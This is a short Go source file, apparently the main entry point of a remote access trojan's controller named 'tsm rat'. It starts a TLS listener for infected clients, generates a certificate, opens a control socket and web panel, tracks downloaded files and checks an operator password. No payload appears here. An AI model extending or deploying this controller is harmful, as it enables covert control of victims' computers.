package main

import (
	"rat/command/log"
	"rat/command/utils"
	"rat/shared"
)

type TempFile struct {
	Path string
	Name string
}

// TempFiles contains mappings to downloaded files in temporary directory
var (
	TempFiles map[string]TempFile
	Config    ClientListener = TLSServer{"127.0.0.1:9999"}
)

func addDownload(tf TempFile) string {
	tempKey := utils.Sha256(tf.Path)
	TempFiles[tempKey] = tf

	return tempKey
}

func main() {
	log.Println("tsm rat", shared.Version)

	if !CertExists() {
		log.Println("generating certificate...")
		GenerateCertificate("localhost")
	}

	go Config.Listen()

	InitControlSocket()

	startWebserver()
}

func init() {
	TempFiles = make(map[string]TempFile)
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}

func Authenticate(p string) bool {
	return p == GlobalConfig.Password
}
